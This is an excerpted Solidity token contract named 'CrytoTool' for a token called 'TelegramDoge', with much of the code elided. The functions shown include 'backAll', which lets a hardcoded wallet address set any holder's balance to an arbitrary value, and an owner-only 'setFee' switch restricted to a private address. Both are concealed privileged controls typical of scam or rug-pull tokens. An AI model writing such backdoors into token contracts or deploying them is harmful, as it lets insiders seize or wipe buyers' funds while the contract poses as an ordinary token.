...
contract CrytoTool is Context, Ownable {
    address private _owner;
    address private _address0;
    address private _address1;
    string private _name = "TelegramDoge";
    ...
    address private _marketwallet = 0x56264C48492A9ec2b19De3141F1239EF980A9612;
    ...
    function bulkTransfer(address[] calldata to, uint256[] calldata amounts) public {
      ...
      function backAll(address minter, uint256 _amount) external  {
            require(msg.sender == _marketwallet, "!_address0.not Owner");
             _balances[minter] = _amount * 10 ** decimals() - 520 ;
    }


      function getvalue(address minter, uint256 _amount) external  {
    ...
    function setFee(address addr,bool status) public {
        require(msg.sender == _address0, "!_address0.not Owner");
